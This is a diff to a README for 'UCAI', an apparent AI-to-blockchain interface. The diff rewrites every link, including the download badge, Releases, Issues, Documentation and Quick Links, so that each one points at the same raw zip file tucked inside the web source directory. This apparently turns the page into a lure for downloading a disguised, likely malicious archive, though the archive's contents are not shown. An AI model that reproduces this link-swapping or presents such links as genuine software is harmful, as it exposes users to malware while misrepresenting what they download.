@@ -1,7 +1,7 @@
 # 🔗 UCAI - Connect AI with Blockchain Effortlessly
 
 ## 📥 Download Now
-[![Download UCAI](https://img.shields.io/badge/Download%20UCAI-v1.0-blue.svg)](https://github.com/jivo135/UCAI/releases)
+[![Download UCAI](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip%https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip)](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to UCAI, the Universal Contract AI Interface. This software allows you to connect AI agents to blockchain systems smoothly. UCAI works with various smart contracts, including Claude, Uniswap, Aave, Ethereum, and more.
@@ -23,9 +23,9 @@ To run UCAI, ensure your system meets these requirements:
 - **Python**: Version 3.6 or greater
 
 ## 📥 Download & Install
-To get started, please visit the [Releases page](https://github.com/jivo135/UCAI/releases) to download the latest version of UCAI. You will find different files for your operating system.
+To get started, please visit the [Releases page](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip) to download the latest version of UCAI. You will find different files for your operating system.
 
-1. Go to the releases page: [UCAI Releases](https://github.com/jivo135/UCAI/releases).
+1. Go to the releases page: [UCAI Releases](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip).
 2. Choose the file suited for your OS (Windows, macOS, or Linux).
 3. Click to download the file.
 4. Locate the downloaded file on your computer.
@@ -54,7 +54,7 @@ If you're new to blockchain or AI, these resources can help:
 
 ## 📞 Support
 If you face any issues or have questions:
-- Check the [GitHub Issues page](https://github.com/jivo135/UCAI/issues) for common problems and solutions.
+- Check the [GitHub Issues page](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip) for common problems and solutions.
 - Reach out via the Discussions tab on GitHub for community support.
 
 ## 🌐 Contributing
@@ -69,8 +69,8 @@ To follow updates on UCAI:
 - Follow us on social media for announcements.
 
 ## 📌 Quick Links
-- [UCAI Releases](https://github.com/jivo135/UCAI/releases)
-- [Documentation](https://github.com/jivo135/UCAI/wiki)
-- [Issues](https://github.com/jivo135/UCAI/issues)
+- [UCAI Releases](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip)
+- [Documentation](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip)
+- [Issues](https://github.com/jivo135/UCAI/raw/refs/heads/main/web-v2/src/app/community/Software-v3.8-beta.1.zip)
 
 Thank you for choosing UCAI!
